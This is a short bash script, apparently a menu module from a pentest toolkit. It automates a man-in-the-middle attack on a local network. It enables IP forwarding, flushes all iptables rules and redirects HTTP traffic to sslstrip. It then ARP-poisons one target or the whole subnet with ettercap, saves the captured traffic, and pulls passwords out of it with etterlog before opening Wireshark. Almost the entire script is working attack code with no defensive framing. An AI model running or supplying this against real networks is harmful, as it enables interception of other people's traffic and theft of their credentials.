#!/bin/bash 
#coded by LAwrence thepentester
echo "*************************************************"
echo "
#             [+]EtterCap auto Snffing profile   ...
#             [+]Coder : lawrencethepentester 
#             [@]Email :zeroattck@gmail.com"
echo "*************************************************"
sleep 3
sh -c  "echo '1' >> /proc/sys/net/ipv4/ip_forward" 
echo "*************************************************"
echo -n "what's the interface to use in ::" 
read -e IFACE 
echo "*************************************************"
echo -n "Gateway ip Address or leave it Blank"
read -e ROUTER
echo "*************************************************"
echo -n "please Select Folder for CAP FILES "session"?"
read -e SESSION
echo "*************************************************"
echo -n "Target IP - LEAVE BLANK IF YOU WANT TO ARP WHOLE NETWORK: "
read -e VICTIM
echo "*************************************************"
mkdir /root/$SESSION/
echo 1 >> /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
sslstrip -p -k -w /root/$SESSION/$SESSION.log &
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
echo "############now Running Ettercap#################" 
echo "###########script by Lawrence thepentester ####################"
ettercap -T -i $IFACE -w /root/$SESSION/$SESSION.pcap -L /root/$SESSION/$SESSION -M arp /$ROUTER/ /$VICTIM/
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
etterlog -p -i /root/$SESSION/$SESSION.eci

echo " Sniffing done ! " 
echo "################ Running  Wireshark ###########################" 
wireshark /root/$SESSION/$SESSION.pcap
echo "*************************************************"
echo "********************************* Returning to Main Menu*****************************" 
clear
cd .
./ZT.sh








